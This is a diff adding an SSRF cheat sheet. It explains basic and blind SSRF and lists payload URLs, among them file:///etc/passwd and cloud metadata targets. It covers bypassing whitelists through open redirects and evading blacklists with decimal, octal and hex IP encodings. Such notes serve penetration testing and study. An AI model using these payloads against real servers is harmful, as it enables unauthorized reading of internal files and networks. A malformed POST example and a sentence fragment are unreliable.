@@ -1,0 +1,147 @@
+
+Server Side Request Forgery
+----------------------------
+----------------------------
+
+
+What is SSRF?
+--------------
+Server Side Request Forgery (SSRF) refers to an attack where in an attacker is able to send a crafted request from a vulnerable web application.
+In a simple way - Attacker asks the server to fetch a URL for him
+
+
+For example
+------------
+	GET /?url=http://google.com/ HTTP/1.1
+	Host: example.com
+
+Here example.com fetch http://google.com from its server
+
+
+Types of SSRF 
+--------------
+	i. The one which displays response to attacker ( Basic )
+	ii. The one which does not display response ( Blind )
+
+
+i. Basic -
+----------
+As mentioned It displays response to attacker, so after the server fetches the URL asked by attacker for him, it will send the response back to attacker
+
+
+What can we do with SSRF?
+--------------------------
+    1. SSRF to Reflected XSS
+    2. Try URL schemas to read internal and make server perform actions (file:///, dict://, ftp://, gopher://..)
+    3. We can scan for internal networks and ports
+    4. If it runs on Cloud Instances try to fetch META-DATA
+
+
+
+ii. Blind -
+-----------
+Not all SSRF vulnerabilities return the response to the attacker. This type of SSRF is known as blind SSRF
+
+
+
+
+Case I
+-------
+	1. http://example.com/index.php?page=about.php
+	2. http://example.com/index.php?page=https://google.com
+	3. http://example.com/index.php?page=file:///etc/passwd
+
+Case -II
+---------
+Try changing urls in POST request
+
+	POST /test/demo_form.php HTTP/1.1
+	Host: example.com?url=https://example.com/as&name2=value2
+
+
+
+
+
+
+
+
+Bypass Whitelisting and Blacklisting
+-------------------------------------
+-------------------------------------
+	Lets talk about whitelisting and blacklisting first
+
+
+whitelisting - Allowing specific URL’s (Allowed Hosts)
+-------------
+	Lets say if a server whitelist google.com and u can fetch only google.com using SSRF and rest all other domains get rejected
+	The only way to bypass whitelisting is find an open redirect in the whitelisted domain. Lets look in to example
+
+
+	Case - 1
+	--------
+		>> www.example.com whitelisted abc.com and you found SSRF in example.com
+
+		1. http://example.com/ssrf.php?url=https://google.com   ->>>>>   Fails to fetch as it is not whitelisted
+
+		2. http://example.com/ssrf.php?url=http://abc.com/?redirect=https://google.com   ->>>>>   Successfully fetches google.com
+
+
+	Case - 2
+	--------
+
+		>> www.example.com whitelisted *.abc.com and you found SSRF in example.com
+
+		1. http://example.com/ssrf.php?url=https://google.com   ->>>>>   Fails to fetch as it is not whitelisted
+
+		This can be bypassed if you get any subdomain takeover on *.abc.com and use it to iframe or redirect it to desired site
+
+		2. http://example.com/ssrf.php?url=http://subdomain.abc.com/?redirect=https://google.com   ->>>>>   Successfully fetches google.com
+
+
+
+
+blacklisting - Blocking specific URL’s (Disallowed Hosts)
+--------------
+	In the same way if a server blacklist google.com and when you ask the server to fetch google.com it blocks
+	Blacklisting can be bypassed in many ways
+
+
+	Converting IP to Decimal -
+	------------------------------
+In this example we'll use 206.191.158.55. Enter the following keystrokes into the calculator exactly as shown:
+206 * 256 + 191 = * 256 + 158 = * 256 + 55 =
+The dword equivalent of the IP address will be the result. In this case, 3468664375. 
+
+http://3468664375/obscure.htm
+or:
+http://206.12557879/obscure.htm
+or:
+http://206.191.40503/obscure.htm 
+
+
+		1. http://0177.0.0.1/ = http://127.0.0.1
+		2. http://2130706433/ = http://127.0.0.1
+		3. http://3232235521/ = http://192.168.0.1
+		4. http://3232235777/ = http://192.168.1.1
+
+
+	Converting IP to Octal -
+	------------------------------
+		converting http://192.168.0.1 to doted octal http://0300.0250.0000.0001 and dot less http://030052000001
+
+
+	Converting IP to hexadecimal -
+	------------------------------
+		1. converting http://192.168.0.1 to doted hex - http://c0.a8.00.01 and dot less hex http://0xc0a80001
+		2. http://206.191.158.55/obscure.htm   >>>>   http://3468664375@3468664375/o%62s%63ur%65%2e%68t%6D
+
+	3. http://0xCE.0xBF.0x9E.0x37/obscure.htm
+	or:
+	4. http://0xCeBF9e37/obscure.htm
+	or:
+		be added to the left of the "real" number
+	5. http://0x9A3F0800CEBF9E37/obscure.htm
+
+
+
+
